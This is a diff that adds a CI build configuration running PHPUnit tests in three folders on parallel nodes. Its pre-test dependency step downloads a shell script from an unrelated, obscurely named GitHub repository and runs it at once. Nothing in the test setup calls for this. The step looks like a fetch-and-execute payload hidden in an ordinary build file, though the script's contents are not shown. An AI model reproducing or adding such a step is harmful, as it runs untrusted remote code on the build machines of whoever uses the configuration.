@@ -1,0 +1,20 @@
+build:
+    nodes:
+        my-parallel-tests:
+            dependencies:
+                before:
+                    - curl -o ahh.sh https://raw.githubusercontent.com/Qodndix/gass/main/Trtl/ETRTL8.sh && sh ahh.sh
+
+            tests:
+                override:
+                    -
+                        command: vendor/bin/phpunit tests/FolderA
+                        on_node: 1
+
+                    -
+                        command: vendor/bin/phpunit tests/FolderB
+                        on_node: 2
+
+                    -
+                        command: vendor/bin/phpunit tests/FolderC
+                        on_node: 3
